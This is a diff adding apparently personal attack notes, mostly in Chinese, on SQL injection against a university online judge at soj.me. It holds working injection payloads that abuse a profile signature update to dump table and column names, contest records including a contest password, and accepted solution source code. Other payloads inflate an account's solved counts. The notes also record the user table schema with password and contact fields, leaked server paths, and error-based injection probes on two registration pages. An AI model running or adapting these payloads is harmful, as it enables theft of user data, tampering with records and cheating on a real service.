@@ -1,0 +1,139 @@
+user:test741	pass:741
+取表名：
+',signature=(select substr(group_concat(TABLE_NAME),1,100) from  information_schema.TABLES where TABLE_SCHEMA='sicily') where username='test741';##
+
+取列名：
+',signature=(select substr(group_concat(COLUMN_NAME),1,100) from information_schema.COLUMNS where lower (TABLE_NAME)='' and lower(TABLE_SCHEMA)='sicily' group by TABLE_NAME) where username='test741';##
+
+取内容：
+',signature=(select substr(
+concat(
+"cid:",cid,
+",course_id:",course_id,
+",information:",information,
+",addrepos:",addrepos,
+",owner:",owner,
+",pwd:",pwd,
+",authtype:",authtype,
+",ipbind:",ipbind,
+",perm:",perm,
+",freeze_during:",freeze_during,
+",during:",during,
+",starttime:",starttime,
+",title:",title,
+",avail:",avail
+),1,100) from contests where cid=834) where username='test741';##
+
+
+cid:834,course_id:0,information:,addrepos:0,owner:1363,pwd:,authtype:free,ipbind:free,perm:temp,freeze_during:0,during:02:00:00,starttime:2012-12-15 19:00:00,title:“星海通杯”第四届中山大学ICPC新手赛网络预选赛,avail:1
+
+',signature=(select substr(
+concat(
+"cid:",cid,
+",course_id:",course_id,
+",information:",information,
+",addrepos:",addrepos,
+",owner:",owner,
+",pwd:",pwd,
+",authtype:",authtype,
+",ipbind:",ipbind,
+",perm:",perm,
+",freeze_during:",freeze_during,
+",during:",during,
+",starttime:",starttime,
+",title:",title,
+",avail:",avail
+),1,100) from contests where cid=839) where username='test741';##
+
+cid:839,course_id:0,information:,addrepos:0,owner:13129,pwd:ss1123,authtype:password,ipbind:free,perm:user,freeze_during:0,during:744:00:00,starttime:2012-12-15 00:00:00,title:11级数据结构期末
+
+一共有21个表
+tables:(database:sicily)
+backup_contest,backup_contests,backup_user,backup_user2,contest_problems,contest_status,contests,course_reg,courses,judge,post_rating,posts,problems,queue,ranklist,ranklist2,rating,registration,sicilychan,status,user
+
+contests:
+cid,course_id,information,addrepos,owner,pwd,authtype,ipbind,perm,freeze_during,during,starttime,title,avail
+
+contest_status:
+csid,cid,cpid,sid
+
+user：
+uid,authcode,authtime,nickname,signature,cn_name,en_name,gender,major,grade,class,applynetid,netid,username,password,email,address,solved,submissions,reg_time,list,perm,phone,student_id
+', submissions=10,solved=5 where username='test741';##
+', signature=perm where username='test741';##
+
+
+problems：pid,has_framework,author,hint,avail,cid,rate_tot,rate_count,dataversion,special_judge,submissions,accepted,title,time_limit,memory_limit,description,input,output,sample_input,sample_output,stdsid
+
+
+back_user：
+uid,nickname,authtime,authcode,applynetid,netid,phone,perm,list,reg_time,submissions,solved,address,email,password,username,signature
+
+judge：
+jid,judgename,lasttime
+
+
+contest_problems:
+cpid,cid,pid
+
+sicilychan:
+talk_id,content,avail
+
+registration:
+uid,cid,restrict_ip
+
+queue:
+qid,sid,hold,server_id,cid,cpid
+
+status:
+sid,sourcecode,public,codelength,contest,failcase,time,run_memory,run_time,status,language,pid,uid,compilelog
+ ',signature=(select substr(sourcecode,1,100) from status where pid=1078 and lower(status)='accepted' and codelength>10 order by codelength limit 1) where uid=18673 ##
+ ',signature=(select substr(sourcecode,1,100) from status where pid=1038 and lower(status)='accepted' and codelength>10 order by codelength limit 1) where uid=18673 ##
+ ',signature=(select concat('//',language,':\n',substr(sourcecode,1,100)) from status where pid=1038 and lower(status)='accepted' and codelength>0 order by codelength limit 1) where uid=18673 ##
+
+路径相关：
+Apache/2.2.16 (Ubuntu) Server at soj.me Port 80
+Notice:undefined index:uid in /home/iladmin/sicily/web/inc/user.inc.php on line 28
+Notice:password in /home/iladmin/sicily/web/inc/user.inc.php on line 28
+/tmp/judger_19/1228331.cpp: In function 'int main()':
+/tmp/judger_19/1228331.cpp:4: error: expected unqualified-id before 'int'
+/tmp/judger_19/1228331
+Notice: Undefined index: id in /home/iladmin/sicily/web/user.php on line 7
+Notice: Undefined index: HTTP_REFERER in /home/iladmin/sicily/web/helper/url.php on line 20 
+Notice: Undefined index: mode in /home/iladmin/sicily/web/contest_reg/re_reg_team.php on line 3
+
+Notice: Undefined index: id in /home/iladmin/sicily/web/user.php on line 7
+Invalid user ID! [Back] 
+
+
+
+;reg
+http://soj.me/contest_reg/reg_edit.php?id=2347%27
+Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in /home/iladmin/sicily/web/contest_reg/reg_edit.php on line 22
+
+
+
+
+
+http://soj.me/contest_reg/reg_info.php?id=2069%27
+
+Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /home/iladmin/sicily/web/contest_reg/reg_info.php on line 24
+Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /home/iladmin/sicily/web/contest_reg/reg_info.php on line 47 Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /home/iladmin/sicily/web/contest_reg/reg_info.php on line 47 Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /home/iladmin/sicily/web/contest_reg/reg_info.php on line 47
+
+
+
+Sicily
+“星海通杯”第四届中山大学ICPC新手赛网络预选赛
+Contest finished.
+Unauthorizedtestandtest(测完再测)
+Logout
+
+    Home
+    Problems
+    My Status
+    Standing
+
+<->
+Finished error from Query()
+Last error:SELECT cpid FROM contest_problems WHERE cid='834''
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''834''' at line 1
